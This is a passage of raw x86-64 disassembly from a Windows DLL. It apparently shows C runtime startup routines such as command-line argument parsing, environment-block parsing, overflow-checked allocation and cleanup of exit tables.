   180006b45:	49 83 c6 08          	add    $0x8,%r14
   180006b49:	40 32 ed             	xor    %bpl,%bpl
   180006b4c:	80 3f 22             	cmpb   $0x22,(%rdi)
   180006b4f:	75 0f                	jne    0x180006b60
   180006b51:	40 84 ed             	test   %bpl,%bpl
   180006b54:	40 b6 22             	mov    $0x22,%sil
   180006b57:	40 0f 94 c5          	sete   %bpl
   180006b5b:	48 ff c7             	inc    %rdi
   180006b5e:	eb 37                	jmp    0x180006b97
   180006b60:	49 ff 07             	incq   (%r15)
   180006b63:	48 85 db             	test   %rbx,%rbx
   180006b66:	74 07                	je     0x180006b6f
   180006b68:	8a 07                	mov    (%rdi),%al
   180006b6a:	88 03                	mov    %al,(%rbx)
   180006b6c:	48 ff c3             	inc    %rbx
   180006b6f:	0f be 37             	movsbl (%rdi),%esi
   180006b72:	48 ff c7             	inc    %rdi
   180006b75:	8b ce                	mov    %esi,%ecx
   180006b77:	e8 28 2e 00 00       	call   0x1800099a4
   180006b7c:	85 c0                	test   %eax,%eax
   180006b7e:	74 12                	je     0x180006b92
   180006b80:	49 ff 07             	incq   (%r15)
   180006b83:	48 85 db             	test   %rbx,%rbx
   180006b86:	74 07                	je     0x180006b8f
   180006b88:	8a 07                	mov    (%rdi),%al
   180006b8a:	88 03                	mov    %al,(%rbx)
   180006b8c:	48 ff c3             	inc    %rbx
   180006b8f:	48 ff c7             	inc    %rdi
   180006b92:	40 84 f6             	test   %sil,%sil
   180006b95:	74 1c                	je     0x180006bb3
   180006b97:	40 84 ed             	test   %bpl,%bpl
   180006b9a:	75 b0                	jne    0x180006b4c
   180006b9c:	40 80 fe 20          	cmp    $0x20,%sil
   180006ba0:	74 06                	je     0x180006ba8
   180006ba2:	40 80 fe 09          	cmp    $0x9,%sil
   180006ba6:	75 a4                	jne    0x180006b4c
   180006ba8:	48 85 db             	test   %rbx,%rbx
   180006bab:	74 09                	je     0x180006bb6
   180006bad:	c6 43 ff 00          	movb   $0x0,-0x1(%rbx)
   180006bb1:	eb 03                	jmp    0x180006bb6
   180006bb3:	48 ff cf             	dec    %rdi
   180006bb6:	40 32 f6             	xor    %sil,%sil
   180006bb9:	8a 07                	mov    (%rdi),%al
   180006bbb:	84 c0                	test   %al,%al
   180006bbd:	0f 84 d4 00 00 00    	je     0x180006c97
   180006bc3:	3c 20                	cmp    $0x20,%al
   180006bc5:	74 04                	je     0x180006bcb
   180006bc7:	3c 09                	cmp    $0x9,%al
   180006bc9:	75 07                	jne    0x180006bd2
   180006bcb:	48 ff c7             	inc    %rdi
   180006bce:	8a 07                	mov    (%rdi),%al
   180006bd0:	eb f1                	jmp    0x180006bc3
   180006bd2:	84 c0                	test   %al,%al
   180006bd4:	0f 84 bd 00 00 00    	je     0x180006c97
   180006bda:	4d 85 f6             	test   %r14,%r14
   180006bdd:	74 07                	je     0x180006be6
   180006bdf:	49 89 1e             	mov    %rbx,(%r14)
   180006be2:	49 83 c6 08          	add    $0x8,%r14
   180006be6:	49 ff 04 24          	incq   (%r12)
   180006bea:	ba 01 00 00 00       	mov    $0x1,%edx
   180006bef:	33 c0                	xor    %eax,%eax
   180006bf1:	eb 05                	jmp    0x180006bf8
   180006bf3:	48 ff c7             	inc    %rdi
   180006bf6:	ff c0                	inc    %eax
   180006bf8:	8a 0f                	mov    (%rdi),%cl
   180006bfa:	80 f9 5c             	cmp    $0x5c,%cl
   180006bfd:	74 f4                	je     0x180006bf3
   180006bff:	80 f9 22             	cmp    $0x22,%cl
   180006c02:	75 30                	jne    0x180006c34
   180006c04:	84 c2                	test   %al,%dl
   180006c06:	75 18                	jne    0x180006c20
   180006c08:	40 84 f6             	test   %sil,%sil
   180006c0b:	74 0a                	je     0x180006c17
   180006c0d:	38 4f 01             	cmp    %cl,0x1(%rdi)
   180006c10:	75 05                	jne    0x180006c17
   180006c12:	48 ff c7             	inc    %rdi
   180006c15:	eb 09                	jmp    0x180006c20
   180006c17:	33 d2                	xor    %edx,%edx
   180006c19:	40 84 f6             	test   %sil,%sil
   180006c1c:	40 0f 94 c6          	sete   %sil
   180006c20:	d1 e8                	shr    $1,%eax
   180006c22:	eb 10                	jmp    0x180006c34
   180006c24:	ff c8                	dec    %eax
   180006c26:	48 85 db             	test   %rbx,%rbx
   180006c29:	74 06                	je     0x180006c31
   180006c2b:	c6 03 5c             	movb   $0x5c,(%rbx)
   180006c2e:	48 ff c3             	inc    %rbx
   180006c31:	49 ff 07             	incq   (%r15)
   180006c34:	85 c0                	test   %eax,%eax
   180006c36:	75 ec                	jne    0x180006c24
   180006c38:	8a 07                	mov    (%rdi),%al
   180006c3a:	84 c0                	test   %al,%al
   180006c3c:	74 46                	je     0x180006c84
   180006c3e:	40 84 f6             	test   %sil,%sil
   180006c41:	75 08                	jne    0x180006c4b
   180006c43:	3c 20                	cmp    $0x20,%al
   180006c45:	74 3d                	je     0x180006c84
   180006c47:	3c 09                	cmp    $0x9,%al
   180006c49:	74 39                	je     0x180006c84
   180006c4b:	85 d2                	test   %edx,%edx
   180006c4d:	74 2d                	je     0x180006c7c
   180006c4f:	48 85 db             	test   %rbx,%rbx
   180006c52:	74 07                	je     0x180006c5b
   180006c54:	88 03                	mov    %al,(%rbx)
   180006c56:	48 ff c3             	inc    %rbx
   180006c59:	8a 07                	mov    (%rdi),%al
   180006c5b:	0f be c8             	movsbl %al,%ecx
   180006c5e:	e8 41 2d 00 00       	call   0x1800099a4
   180006c63:	85 c0                	test   %eax,%eax
   180006c65:	74 12                	je     0x180006c79
   180006c67:	49 ff 07             	incq   (%r15)
   180006c6a:	48 ff c7             	inc    %rdi
   180006c6d:	48 85 db             	test   %rbx,%rbx
   180006c70:	74 07                	je     0x180006c79
   180006c72:	8a 07                	mov    (%rdi),%al
   180006c74:	88 03                	mov    %al,(%rbx)
   180006c76:	48 ff c3             	inc    %rbx
   180006c79:	49 ff 07             	incq   (%r15)
   180006c7c:	48 ff c7             	inc    %rdi
   180006c7f:	e9 66 ff ff ff       	jmp    0x180006bea
   180006c84:	48 85 db             	test   %rbx,%rbx
   180006c87:	74 06                	je     0x180006c8f
   180006c89:	c6 03 00             	movb   $0x0,(%rbx)
   180006c8c:	48 ff c3             	inc    %rbx
   180006c8f:	49 ff 07             	incq   (%r15)
   180006c92:	e9 22 ff ff ff       	jmp    0x180006bb9
   180006c97:	4d 85 f6             	test   %r14,%r14
   180006c9a:	74 04                	je     0x180006ca0
   180006c9c:	49 83 26 00          	andq   $0x0,(%r14)
   180006ca0:	49 ff 04 24          	incq   (%r12)
   180006ca4:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   180006ca9:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   180006cae:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   180006cb3:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   180006cb8:	48 83 c4 20          	add    $0x20,%rsp
   180006cbc:	41 5f                	pop    %r15
   180006cbe:	41 5e                	pop    %r14
   180006cc0:	41 5c                	pop    %r12
   180006cc2:	c3                   	ret
   180006cc3:	cc                   	int3
   180006cc4:	40 53                	rex push %rbx
   180006cc6:	48 83 ec 20          	sub    $0x20,%rsp
   180006cca:	48 b8 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rax
   180006cd1:	ff ff 1f 
   180006cd4:	4c 8b ca             	mov    %rdx,%r9
   180006cd7:	48 3b c8             	cmp    %rax,%rcx
   180006cda:	73 3d                	jae    0x180006d19
   180006cdc:	33 d2                	xor    %edx,%edx
   180006cde:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   180006ce2:	49 f7 f0             	div    %r8
   180006ce5:	4c 3b c8             	cmp    %rax,%r9
   180006ce8:	73 2f                	jae    0x180006d19
   180006cea:	48 c1 e1 03          	shl    $0x3,%rcx
   180006cee:	4d 0f af c8          	imul   %r8,%r9
   180006cf2:	48 8b c1             	mov    %rcx,%rax
   180006cf5:	48 f7 d0             	not    %rax
   180006cf8:	49 3b c1             	cmp    %r9,%rax
   180006cfb:	76 1c                	jbe    0x180006d19
   180006cfd:	49 03 c9             	add    %r9,%rcx
   180006d00:	ba 01 00 00 00       	mov    $0x1,%edx
   180006d05:	e8 12 15 00 00       	call   0x18000821c
   180006d0a:	33 c9                	xor    %ecx,%ecx
   180006d0c:	48 8b d8             	mov    %rax,%rbx
   180006d0f:	e8 80 15 00 00       	call   0x180008294
   180006d14:	48 8b c3             	mov    %rbx,%rax
   180006d17:	eb 02                	jmp    0x180006d1b
   180006d19:	33 c0                	xor    %eax,%eax
   180006d1b:	48 83 c4 20          	add    $0x20,%rsp
   180006d1f:	5b                   	pop    %rbx
   180006d20:	c3                   	ret
   180006d21:	cc                   	int3
   180006d22:	cc                   	int3
   180006d23:	cc                   	int3
   180006d24:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180006d29:	55                   	push   %rbp
   180006d2a:	56                   	push   %rsi
   180006d2b:	57                   	push   %rdi
   180006d2c:	41 56                	push   %r14
   180006d2e:	41 57                	push   %r15
   180006d30:	48 8b ec             	mov    %rsp,%rbp
   180006d33:	48 83 ec 30          	sub    $0x30,%rsp
   180006d37:	33 ff                	xor    %edi,%edi
   180006d39:	44 8b f1             	mov    %ecx,%r14d
   180006d3c:	85 c9                	test   %ecx,%ecx
   180006d3e:	0f 84 53 01 00 00    	je     0x180006e97
   180006d44:	8d 41 ff             	lea    -0x1(%rcx),%eax
   180006d47:	83 f8 01             	cmp    $0x1,%eax
   180006d4a:	76 16                	jbe    0x180006d62
   180006d4c:	e8 ab 14 00 00       	call   0x1800081fc
   180006d51:	8d 5f 16             	lea    0x16(%rdi),%ebx
   180006d54:	89 18                	mov    %ebx,(%rax)
   180006d56:	e8 e1 f8 ff ff       	call   0x18000663c
   180006d5b:	8b fb                	mov    %ebx,%edi
   180006d5d:	e9 35 01 00 00       	jmp    0x180006e97
   180006d62:	e8 8d 28 00 00       	call   0x1800095f4
   180006d67:	48 8d 1d 12 45 01 00 	lea    0x14512(%rip),%rbx        # 0x18001b280
   180006d6e:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   180006d74:	48 8b d3             	mov    %rbx,%rdx
   180006d77:	33 c9                	xor    %ecx,%ecx
   180006d79:	e8 2e 20 00 00       	call   0x180008dac
   180006d7e:	48 8b 35 d3 48 01 00 	mov    0x148d3(%rip),%rsi        # 0x18001b658
   180006d85:	48 89 1d ac 48 01 00 	mov    %rbx,0x148ac(%rip)        # 0x18001b638
   180006d8c:	48 85 f6             	test   %rsi,%rsi
   180006d8f:	74 05                	je     0x180006d96
   180006d91:	40 38 3e             	cmp    %dil,(%rsi)
   180006d94:	75 03                	jne    0x180006d99
   180006d96:	48 8b f3             	mov    %rbx,%rsi
   180006d99:	48 8d 45 48          	lea    0x48(%rbp),%rax
   180006d9d:	48 89 7d 40          	mov    %rdi,0x40(%rbp)
   180006da1:	4c 8d 4d 40          	lea    0x40(%rbp),%r9
   180006da5:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180006daa:	45 33 c0             	xor    %r8d,%r8d
   180006dad:	48 89 7d 48          	mov    %rdi,0x48(%rbp)
   180006db1:	33 d2                	xor    %edx,%edx
   180006db3:	48 8b ce             	mov    %rsi,%rcx
   180006db6:	e8 49 fd ff ff       	call   0x180006b04
   180006dbb:	4c 8b 7d 40          	mov    0x40(%rbp),%r15
   180006dbf:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   180006dc5:	48 8b 55 48          	mov    0x48(%rbp),%rdx
   180006dc9:	49 8b cf             	mov    %r15,%rcx
   180006dcc:	e8 f3 fe ff ff       	call   0x180006cc4
   180006dd1:	48 8b d8             	mov    %rax,%rbx
   180006dd4:	48 85 c0             	test   %rax,%rax
   180006dd7:	75 18                	jne    0x180006df1
   180006dd9:	e8 1e 14 00 00       	call   0x1800081fc
   180006dde:	bb 0c 00 00 00       	mov    $0xc,%ebx
   180006de3:	33 c9                	xor    %ecx,%ecx
   180006de5:	89 18                	mov    %ebx,(%rax)
   180006de7:	e8 a8 14 00 00       	call   0x180008294
   180006dec:	e9 6a ff ff ff       	jmp    0x180006d5b
   180006df1:	4e 8d 04 f8          	lea    (%rax,%r15,8),%r8
   180006df5:	48 8b d3             	mov    %rbx,%rdx
   180006df8:	48 8d 45 48          	lea    0x48(%rbp),%rax
   180006dfc:	48 8b ce             	mov    %rsi,%rcx
   180006dff:	4c 8d 4d 40          	lea    0x40(%rbp),%r9
   180006e03:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180006e08:	e8 f7 fc ff ff       	call   0x180006b04
   180006e0d:	41 83 fe 01          	cmp    $0x1,%r14d
   180006e11:	75 16                	jne    0x180006e29
   180006e13:	8b 45 40             	mov    0x40(%rbp),%eax
   180006e16:	ff c8                	dec    %eax
   180006e18:	48 89 1d 29 48 01 00 	mov    %rbx,0x14829(%rip)        # 0x18001b648
   180006e1f:	89 05 1b 48 01 00    	mov    %eax,0x1481b(%rip)        # 0x18001b640
   180006e25:	33 c9                	xor    %ecx,%ecx
   180006e27:	eb 69                	jmp    0x180006e92
   180006e29:	48 8d 55 38          	lea    0x38(%rbp),%rdx
   180006e2d:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   180006e31:	48 8b cb             	mov    %rbx,%rcx
   180006e34:	e8 57 1e 00 00       	call   0x180008c90
   180006e39:	8b f0                	mov    %eax,%esi
   180006e3b:	85 c0                	test   %eax,%eax
   180006e3d:	74 19                	je     0x180006e58
   180006e3f:	48 8b 4d 38          	mov    0x38(%rbp),%rcx
   180006e43:	e8 4c 14 00 00       	call   0x180008294
   180006e48:	48 8b cb             	mov    %rbx,%rcx
   180006e4b:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   180006e4f:	e8 40 14 00 00       	call   0x180008294
   180006e54:	8b fe                	mov    %esi,%edi
   180006e56:	eb 3f                	jmp    0x180006e97
   180006e58:	48 8b 55 38          	mov    0x38(%rbp),%rdx
   180006e5c:	48 8b cf             	mov    %rdi,%rcx
   180006e5f:	48 8b c2             	mov    %rdx,%rax
   180006e62:	48 39 3a             	cmp    %rdi,(%rdx)
   180006e65:	74 0c                	je     0x180006e73
   180006e67:	48 8d 40 08          	lea    0x8(%rax),%rax
   180006e6b:	48 ff c1             	inc    %rcx
   180006e6e:	48 39 38             	cmp    %rdi,(%rax)
   180006e71:	75 f4                	jne    0x180006e67
   180006e73:	89 0d c7 47 01 00    	mov    %ecx,0x147c7(%rip)        # 0x18001b640
   180006e79:	33 c9                	xor    %ecx,%ecx
   180006e7b:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   180006e7f:	48 89 15 c2 47 01 00 	mov    %rdx,0x147c2(%rip)        # 0x18001b648
   180006e86:	e8 09 14 00 00       	call   0x180008294
   180006e8b:	48 8b cb             	mov    %rbx,%rcx
   180006e8e:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   180006e92:	e8 fd 13 00 00       	call   0x180008294
   180006e97:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   180006e9c:	8b c7                	mov    %edi,%eax
   180006e9e:	48 83 c4 30          	add    $0x30,%rsp
   180006ea2:	41 5f                	pop    %r15
   180006ea4:	41 5e                	pop    %r14
   180006ea6:	5f                   	pop    %rdi
   180006ea7:	5e                   	pop    %rsi
   180006ea8:	5d                   	pop    %rbp
   180006ea9:	c3                   	ret
   180006eaa:	cc                   	int3
   180006eab:	cc                   	int3
   180006eac:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180006eb1:	57                   	push   %rdi
   180006eb2:	48 83 ec 20          	sub    $0x20,%rsp
   180006eb6:	33 ff                	xor    %edi,%edi
   180006eb8:	48 39 3d c9 44 01 00 	cmp    %rdi,0x144c9(%rip)        # 0x18001b388
   180006ebf:	74 04                	je     0x180006ec5
   180006ec1:	33 c0                	xor    %eax,%eax
   180006ec3:	eb 48                	jmp    0x180006f0d
   180006ec5:	e8 2a 27 00 00       	call   0x1800095f4
   180006eca:	e8 1d 2c 00 00       	call   0x180009aec
   180006ecf:	48 8b d8             	mov    %rax,%rbx
   180006ed2:	48 85 c0             	test   %rax,%rax
   180006ed5:	75 05                	jne    0x180006edc
   180006ed7:	83 cf ff             	or     $0xffffffff,%edi
   180006eda:	eb 27                	jmp    0x180006f03
   180006edc:	48 8b cb             	mov    %rbx,%rcx
   180006edf:	e8 34 00 00 00       	call   0x180006f18
   180006ee4:	48 85 c0             	test   %rax,%rax
   180006ee7:	75 05                	jne    0x180006eee
   180006ee9:	83 cf ff             	or     $0xffffffff,%edi
   180006eec:	eb 0e                	jmp    0x180006efc
   180006eee:	48 89 05 ab 44 01 00 	mov    %rax,0x144ab(%rip)        # 0x18001b3a0
   180006ef5:	48 89 05 8c 44 01 00 	mov    %rax,0x1448c(%rip)        # 0x18001b388
   180006efc:	33 c9                	xor    %ecx,%ecx
   180006efe:	e8 91 13 00 00       	call   0x180008294
   180006f03:	48 8b cb             	mov    %rbx,%rcx
   180006f06:	e8 89 13 00 00       	call   0x180008294
   180006f0b:	8b c7                	mov    %edi,%eax
   180006f0d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180006f12:	48 83 c4 20          	add    $0x20,%rsp
   180006f16:	5f                   	pop    %rdi
   180006f17:	c3                   	ret
   180006f18:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180006f1d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   180006f22:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180006f27:	57                   	push   %rdi
   180006f28:	41 56                	push   %r14
   180006f2a:	41 57                	push   %r15
   180006f2c:	48 83 ec 30          	sub    $0x30,%rsp
   180006f30:	4c 8b f1             	mov    %rcx,%r14
   180006f33:	33 f6                	xor    %esi,%esi
   180006f35:	8b ce                	mov    %esi,%ecx
   180006f37:	4d 8b c6             	mov    %r14,%r8
   180006f3a:	41 8a 16             	mov    (%r14),%dl
   180006f3d:	eb 24                	jmp    0x180006f63
   180006f3f:	80 fa 3d             	cmp    $0x3d,%dl
   180006f42:	48 8d 41 01          	lea    0x1(%rcx),%rax
   180006f46:	48 0f 44 c1          	cmove  %rcx,%rax
   180006f4a:	48 8b c8             	mov    %rax,%rcx
   180006f4d:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   180006f51:	48 ff c0             	inc    %rax
   180006f54:	41 38 34 00          	cmp    %sil,(%r8,%rax,1)
   180006f58:	75 f7                	jne    0x180006f51
   180006f5a:	49 ff c0             	inc    %r8
   180006f5d:	4c 03 c0             	add    %rax,%r8
   180006f60:	41 8a 10             	mov    (%r8),%dl
   180006f63:	84 d2                	test   %dl,%dl
   180006f65:	75 d8                	jne    0x180006f3f
   180006f67:	48 ff c1             	inc    %rcx
   180006f6a:	ba 08 00 00 00       	mov    $0x8,%edx
   180006f6f:	e8 a8 12 00 00       	call   0x18000821c
   180006f74:	48 8b d8             	mov    %rax,%rbx
   180006f77:	48 85 c0             	test   %rax,%rax
   180006f7a:	74 6c                	je     0x180006fe8
   180006f7c:	4c 8b f8             	mov    %rax,%r15
   180006f7f:	41 8a 06             	mov    (%r14),%al
   180006f82:	84 c0                	test   %al,%al
   180006f84:	74 5f                	je     0x180006fe5
   180006f86:	48 83 cd ff          	or     $0xffffffffffffffff,%rbp
   180006f8a:	48 ff c5             	inc    %rbp
   180006f8d:	41 38 34 2e          	cmp    %sil,(%r14,%rbp,1)
   180006f91:	75 f7                	jne    0x180006f8a
   180006f93:	48 ff c5             	inc    %rbp
   180006f96:	3c 3d                	cmp    $0x3d,%al
   180006f98:	74 35                	je     0x180006fcf
   180006f9a:	ba 01 00 00 00       	mov    $0x1,%edx
   180006f9f:	48 8b cd             	mov    %rbp,%rcx
   180006fa2:	e8 75 12 00 00       	call   0x18000821c
   180006fa7:	48 8b f8             	mov    %rax,%rdi
   180006faa:	48 85 c0             	test   %rax,%rax
   180006fad:	74 25                	je     0x180006fd4
   180006faf:	4d 8b c6             	mov    %r14,%r8
   180006fb2:	48 8b d5             	mov    %rbp,%rdx
   180006fb5:	48 8b c8             	mov    %rax,%rcx
   180006fb8:	e8 6f 08 00 00       	call   0x18000782c
   180006fbd:	33 c9                	xor    %ecx,%ecx
   180006fbf:	85 c0                	test   %eax,%eax
   180006fc1:	75 48                	jne    0x18000700b
   180006fc3:	49 89 3f             	mov    %rdi,(%r15)
   180006fc6:	49 83 c7 08          	add    $0x8,%r15
   180006fca:	e8 c5 12 00 00       	call   0x180008294
   180006fcf:	4c 03 f5             	add    %rbp,%r14
   180006fd2:	eb ab                	jmp    0x180006f7f
   180006fd4:	48 8b cb             	mov    %rbx,%rcx
   180006fd7:	e8 44 00 00 00       	call   0x180007020
   180006fdc:	33 c9                	xor    %ecx,%ecx
   180006fde:	e8 b1 12 00 00       	call   0x180008294
   180006fe3:	eb 03                	jmp    0x180006fe8
   180006fe5:	48 8b f3             	mov    %rbx,%rsi
   180006fe8:	33 c9                	xor    %ecx,%ecx
   180006fea:	e8 a5 12 00 00       	call   0x180008294
   180006fef:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   180006ff4:	48 8b c6             	mov    %rsi,%rax
   180006ff7:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   180006ffc:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   180007001:	48 83 c4 30          	add    $0x30,%rsp
   180007005:	41 5f                	pop    %r15
   180007007:	41 5e                	pop    %r14
   180007009:	5f                   	pop    %rdi
   18000700a:	c3                   	ret
   18000700b:	45 33 c9             	xor    %r9d,%r9d
   18000700e:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   180007013:	45 33 c0             	xor    %r8d,%r8d
   180007016:	33 d2                	xor    %edx,%edx
   180007018:	e8 6f f6 ff ff       	call   0x18000668c
   18000701d:	cc                   	int3
   18000701e:	cc                   	int3
   18000701f:	cc                   	int3
   180007020:	48 85 c9             	test   %rcx,%rcx
   180007023:	74 3b                	je     0x180007060
   180007025:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000702a:	57                   	push   %rdi
   18000702b:	48 83 ec 20          	sub    $0x20,%rsp
   18000702f:	48 8b 01             	mov    (%rcx),%rax
   180007032:	48 8b d9             	mov    %rcx,%rbx
   180007035:	48 8b f9             	mov    %rcx,%rdi
   180007038:	eb 0f                	jmp    0x180007049
   18000703a:	48 8b c8             	mov    %rax,%rcx
   18000703d:	e8 52 12 00 00       	call   0x180008294
   180007042:	48 8d 7f 08          	lea    0x8(%rdi),%rdi
   180007046:	48 8b 07             	mov    (%rdi),%rax
   180007049:	48 85 c0             	test   %rax,%rax
   18000704c:	75 ec                	jne    0x18000703a
   18000704e:	48 8b cb             	mov    %rbx,%rcx
   180007051:	e8 3e 12 00 00       	call   0x180008294
   180007056:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000705b:	48 83 c4 20          	add    $0x20,%rsp
   18000705f:	5f                   	pop    %rdi
   180007060:	c3                   	ret
   180007061:	cc                   	int3
   180007062:	cc                   	int3
   180007063:	cc                   	int3
   180007064:	48 83 ec 28          	sub    $0x28,%rsp
   180007068:	48 8b 09             	mov    (%rcx),%rcx
   18000706b:	48 3b 0d 2e 43 01 00 	cmp    0x1432e(%rip),%rcx        # 0x18001b3a0
   180007072:	74 05                	je     0x180007079
   180007074:	e8 a7 ff ff ff       	call   0x180007020
   180007079:	48 83 c4 28          	add    $0x28,%rsp
   18000707d:	c3                   	ret
   18000707e:	cc                   	int3
   18000707f:	cc                   	int3
   180007080:	48 83 ec 28          	sub    $0x28,%rsp
   180007084:	48 8b 09             	mov    (%rcx),%rcx
   180007087:	48 3b 0d 0a 43 01 00 	cmp    0x1430a(%rip),%rcx        # 0x18001b398
   18000708e:	74 05                	je     0x180007095
   180007090:	e8 8b ff ff ff       	call   0x180007020
   180007095:	48 83 c4 28          	add    $0x28,%rsp
   180007099:	c3                   	ret
   18000709a:	cc                   	int3
   18000709b:	cc                   	int3
   18000709c:	48 83 ec 28          	sub    $0x28,%rsp
   1800070a0:	48 8d 0d e1 42 01 00 	lea    0x142e1(%rip),%rcx        # 0x18001b388
   1800070a7:	e8 b8 ff ff ff       	call   0x180007064
   1800070ac:	48 8d 0d dd 42 01 00 	lea    0x142dd(%rip),%rcx        # 0x18001b390
   1800070b3:	e8 c8 ff ff ff       	call   0x180007080
   1800070b8:	48 8b 0d e1 42 01 00 	mov    0x142e1(%rip),%rcx        # 0x18001b3a0
   1800070bf:	e8 5c ff ff ff       	call   0x180007020
   1800070c4:	48 8b 0d cd 42 01 00 	mov    0x142cd(%rip),%rcx        # 0x18001b398
   1800070cb:	48 83 c4 28          	add    $0x28,%rsp
   1800070cf:	e9 4c ff ff ff       	jmp    0x180007020
   1800070d4:	e9 d3 fd ff ff       	jmp    0x180006eac
   1800070d9:	cc                   	int3
   1800070da:	cc                   	int3
   1800070db:	cc                   	int3
   1800070dc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800070e1:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1800070e6:	57                   	push   %rdi
   1800070e7:	48 83 ec 20          	sub    $0x20,%rsp
   1800070eb:	49 8b d9             	mov    %r9,%rbx
   1800070ee:	49 8b f8             	mov    %r8,%rdi
   1800070f1:	8b 0a                	mov    (%rdx),%ecx
   1800070f3:	e8 a0 0f 00 00       	call   0x180008098
   1800070f8:	90                   	nop
   1800070f9:	48 8b cf             	mov    %rdi,%rcx
   1800070fc:	e8 53 00 00 00       	call   0x180007154
   180007101:	8b f8                	mov    %eax,%edi
   180007103:	8b 0b                	mov    (%rbx),%ecx
   180007105:	e8 e2 0f 00 00       	call   0x1800080ec
   18000710a:	8b c7                	mov    %edi,%eax
   18000710c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180007111:	48 83 c4 20          	add    $0x20,%rsp
   180007115:	5f                   	pop    %rdi
   180007116:	c3                   	ret
   180007117:	cc                   	int3
   180007118:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000711d:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   180007122:	57                   	push   %rdi
   180007123:	48 83 ec 20          	sub    $0x20,%rsp
   180007127:	49 8b d9             	mov    %r9,%rbx
   18000712a:	49 8b f8             	mov    %r8,%rdi
   18000712d:	8b 0a                	mov    (%rdx),%ecx
   18000712f:	e8 64 0f 00 00       	call   0x180008098
   180007134:	90                   	nop
   180007135:	48 8b cf             	mov    %rdi,%rcx
   180007138:	e8 c7 01 00 00       	call   0x180007304
   18000713d:	8b f8                	mov    %eax,%edi
   18000713f:	8b 0b                	mov    (%rbx),%ecx
   180007141:	e8 a6 0f 00 00       	call   0x1800080ec
   180007146:	8b c7                	mov    %edi,%eax
   180007148:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000714d:	48 83 c4 20          	add    $0x20,%rsp
   180007151:	5f                   	pop    %rdi
   180007152:	c3                   	ret
   180007153:	cc                   	int3
   180007154:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180007159:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   18000715e:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   180007163:	57                   	push   %rdi
   180007164:	41 56                	push   %r14
   180007166:	41 57                	push   %r15
   180007168:	48 83 ec 20          	sub    $0x20,%rsp
   18000716c:	48 8b 01             	mov    (%rcx),%rax
   18000716f:	33 ed                	xor    %ebp,%ebp
   180007171:	4c 8b f9             	mov    %rcx,%r15
   180007174:	48 8b 18             	mov    (%rax),%rbx
   180007177:	48 85 db             	test   %rbx,%rbx
   18000717a:	0f 84 68 01 00 00    	je     0x1800072e8
   180007180:	4c 8b 15 89 2e 01 00 	mov    0x12e89(%rip),%r10        # 0x18001a010
   180007187:	4c 8b 4b 08          	mov    0x8(%rbx),%r9
   18000718b:	49 8b f2             	mov    %r10,%rsi
   18000718e:	48 33 33             	xor    (%rbx),%rsi
   180007191:	4d 33 ca             	xor    %r10,%r9
   180007194:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
   180007198:	41 8b ca             	mov    %r10d,%ecx
   18000719b:	83 e1 3f             	and    $0x3f,%ecx
   18000719e:	49 33 da             	xor    %r10,%rbx
   1800071a1:	48 d3 cb             	ror    %cl,%rbx
   1800071a4:	48 d3 ce             	ror    %cl,%rsi
   1800071a7:	49 d3 c9             	ror    %cl,%r9
   1800071aa:	4c 3b cb             	cmp    %rbx,%r9
   1800071ad:	0f 85 a7 00 00 00    	jne    0x18000725a
   1800071b3:	48 2b de             	sub    %rsi,%rbx
   1800071b6:	b8 00 02 00 00       	mov    $0x200,%eax
   1800071bb:	48 c1 fb 03          	sar    $0x3,%rbx
   1800071bf:	48 3b d8             	cmp    %rax,%rbx
   1800071c2:	48 8b fb             	mov    %rbx,%rdi
   1800071c5:	48 0f 47 f8          	cmova  %rax,%rdi
   1800071c9:	8d 45 20             	lea    0x20(%rbp),%eax
   1800071cc:	48 03 fb             	add    %rbx,%rdi
   1800071cf:	48 0f 44 f8          	cmove  %rax,%rdi
   1800071d3:	48 3b fb             	cmp    %rbx,%rdi
   1800071d6:	72 1e                	jb     0x1800071f6
   1800071d8:	44 8d 45 08          	lea    0x8(%rbp),%r8d
   1800071dc:	48 8b d7             	mov    %rdi,%rdx
   1800071df:	48 8b ce             	mov    %rsi,%rcx
   1800071e2:	e8 09 2a 00 00       	call   0x180009bf0
   1800071e7:	33 c9                	xor    %ecx,%ecx
   1800071e9:	4c 8b f0             	mov    %rax,%r14
   1800071ec:	e8 a3 10 00 00       	call   0x180008294
   1800071f1:	4d 85 f6             	test   %r14,%r14
   1800071f4:	75 28                	jne    0x18000721e
   1800071f6:	48 8d 7b 04          	lea    0x4(%rbx),%rdi
